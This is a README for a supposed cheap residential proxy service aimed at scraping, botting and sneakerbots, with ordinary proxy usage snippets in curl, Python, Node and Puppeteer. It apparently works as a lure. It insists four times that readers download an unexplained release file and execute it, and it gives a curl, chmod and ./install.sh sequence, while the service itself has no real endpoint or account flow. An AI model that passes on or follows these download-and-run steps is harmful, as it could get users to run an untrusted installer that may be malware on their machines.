# Cheap Residential Proxies — Global Rotating IPs for Scraping 🌍🔁

[![Releases](https://img.shields.io/badge/Releases-v1.0-blue)](https://github.com/JoeDeep999/cheap-residential-proxies/releases)  

![proxy-banner](https://images.unsplash.com/photo-1518770660439-4636190af475?auto=format&fit=crop&w=1400&q=80)

Fast, low-cost residential proxies across 140+ countries. Designed for scraping, SEO, botting, and resellers. Pricing: $1.25/GB. Support for HTTP(S) and SOCKS5, rotating sessions, geo-targeting, and sticky sessions.

Badges
- Topics: botting, datacenter-proxy, http-proxy, https-proxy, proxies, proxies-http, proxies-scraper, proxies-socks5, proxy, proxy-list, proxy-lists, residental-proxy, rotating-proxy, scraper, scraping, seo, sneakerbot, sneakers, socks5, web-scraping
- Protocols: HTTP(S) | SOCKS5
- Coverage: 140+ countries
- Price: $1.25/GB

Quick download and launch
- Visit the releases page and download the release file. The release file must be downloaded and executed.
- Releases: [https://github.com/JoeDeep999/cheap-residential-proxies/releases](https://github.com/JoeDeep999/cheap-residential-proxies/releases)

Example commands (replace <release-file> with the exact asset name)
```bash
# download the release asset
curl -L -o ./cheap-res-proxy-release.tar.gz https://github.com/JoeDeep999/cheap-residential-proxies/releases/download/v1.0/<release-file>

# extract or make executable, then run
tar -xzf cheap-res-proxy-release.tar.gz
chmod +x install.sh
./install.sh
```

Features
- Real residential IPs from 140+ countries.
- Rotating IP pools and sticky sessions.
- HTTP and HTTPS proxies with basic auth.
- SOCKS5 support for headless browsers and tools.
- Country-level geo-targeting.
- Session control via username or query params.
- Usage-based billing: $1.25 per GB; reseller pricing available.
- API for issuing and rotating ports, managing sessions, and checking usage.

Use cases
- Web scraping with IP rotation.
- SEO rank tracking from multiple regions.
- Sneakerbots and in-app automation.
- Ad verification and content localization checks.
- Resellers who need pooled IPs and usage tracking.

Getting started — HTTP proxy (curl)
```bash
# single request via HTTP proxy
curl -x http://username:password@proxy-host:port "https://httpbin.org/ip"

# rotate via session in username (example form)
curl -x http://user-session-123:password@proxy-host:port "https://httpbin.org/ip"
```

Python example (requests)
```python
import requests

proxy = "http://user:pass@proxy-host:port"
proxies = {"http": proxy, "https": proxy}

r = requests.get("https://httpbin.org/ip", proxies=proxies, timeout=15)
print(r.json())
```

Node.js (got / fetch)
```js
// node-fetch with http-proxy-agent
const fetch = require('node-fetch');
const HttpsProxyAgent = require('https-proxy-agent');

const proxy = 'http://user:pass@proxy-host:port';
const agent = new HttpsProxyAgent(proxy);

fetch('https://httpbin.org/ip', { agent })
  .then(res => res.json())
  .then(console.log)
  .catch(console.error);
```

Puppeteer with SOCKS5 or HTTP proxy
```js
const puppeteer = require('puppeteer');

(async () => {
  const browser = await puppeteer.launch({
    args: [
      '--no-sandbox',
      '--disable-setuid-sandbox',
      '--proxy-server=socks5://proxy-host:port' // or http://user:pass@host:port
    ]
  });
  const page = await browser.newPage();
  // If using HTTP proxy with auth:
  await page.authenticate({ username: 'user', password: 'pass' });

  await page.goto('https://httpbin.org/ip');
  const content = await page.content();
  console.log(content);

  await browser.close();
})();
```

Rotating sessions and sticky sessions
- Use session-based usernames to tie requests to a single IP for a period.
- Format example: username-session-<id>:password@host:port
- For short-lived rotation, change the session id per request.
- For sticky sessions, reuse the same session id for the desired lifetime.

Proxy formats and lists
- Single proxy: host:port
- Auth proxy: user:pass@host:port
- SOCKS5: socks5://user:pass@host:port
- Bulk lists: one proxy per line in proxies.txt

Example proxies.txt
```
user1:pass1@proxy1.example.com:10001
user2:pass2@proxy2.example.com:10002
socks5user:socks5pass@proxy3.example.com:1080
```

Health check script (bash)
```bash
while read PROXY; do
  echo "Checking $PROXY"
  curl -s --max-time 10 -x "http://$PROXY" https://httpbin.org/ip || echo "fail: $PROXY"
done < proxies.txt
```

API access and automation
- Use the releases asset to install CLI tools and example scripts.
- Use the API for:
  - Creating sessions
  - Listing available countries
  - Allocating ports for bots
  - Checking usage and billing

Reseller flow
- Get a reseller API key via the dashboard (install release package to set up CLI).
- Create sub-accounts with per-account limits.
- Pull usage reports and invoice data via API endpoints.
- Bill customers by GB used or by monthly bundle.

Performance tips
- Open fewer long-lived connections for headless browsers.
- Use sticky sessions for multi-step workflows.
- Rotate sessions for one-off requests to avoid IP reuse.
- Spread requests across multiple proxies to stay under per-agent limits.

Security and auth
- Use credential rotation for long-term bots.
- Rotate session ids to isolate sessions per task.
- Use TLS in your requests. The proxy encrypts connect traffic only when using HTTPS to target; the proxy-host connection may still be plain unless the provider supports encrypted channels to the proxy endpoint.

Common errors and fixes
- Connection timed out: check port, firewall, and that the IP is allowed.
- 403/Blocked: rotate session or change country target.
- Auth error: verify username and password or token.
- DNS leaks: use SOCKS5 for full transport, or route DNS through the proxy.

Examples for SEO and scraping tools
- Screaming Frog: set proxy host and port in configuration. Use auth in the proxy settings.
- Scrapy: set the HTTP proxy in downloader middlewares.
- Playwright: pass the --proxy-server argument and call browserContext.addInitScript for auth if needed.

Billing and rate limits
- Price: $1.25 per GB by default.
- The release package includes a billing example and a usage meter CLI.
- Contact sales for volume discounts and flat-rate bundles.

CI / Automation
- Add proxy checks to your CI pipeline for critical scraping jobs.
- Use the CLI from the releases to provision and rotate before tests.
- Cache health-check results to reduce repeated checks.

Assets and release tools
- The releases page contains the installable and helper scripts. Download the release file and execute it to install the CLI, helpers, and example configs.
- Releases: [https://github.com/JoeDeep999/cheap-residential-proxies/releases](https://github.com/JoeDeep999/cheap-residential-proxies/releases)

Examples of release assets you may see
- cheap-residential-proxies-cli.tar.gz
- install.sh
- examples/ (python, node, bash)
- docs/ (api.md, billing.md)

Contributing
- Fork the repo, add tests, and open a pull request.
- Add small, focused commits.
- Include an entry in CHANGELOG for user-facing changes.

Repository layout
- /bin — CLI and installers (in releases)
- /examples — sample scripts for curl, Python, Node, Puppeteer
- /docs — API reference and billing guide
- /tools — health checks, load tests
- /LICENSE

Support and contact
- Open an issue for bugs or feature requests.
- Use pull requests for code changes.
- For account and billing help, attach logs and usage samples when you open an issue.

License
- See LICENSE file in this repository.

Screenshots and icons
![world-map](https://cdn-icons-png.flaticon.com/512/854/854878.png)  
![proxy-icon](https://cdn-icons-png.flaticon.com/512/2948/2948035.png)

Changelog
- See releases for full changelog and release assets. Download the release file and execute it to install the latest CLI and examples.  
- Releases: [https://github.com/JoeDeep999/cheap-residential-proxies/releases](https://github.com/JoeDeep999/cheap-residential-proxies/releases)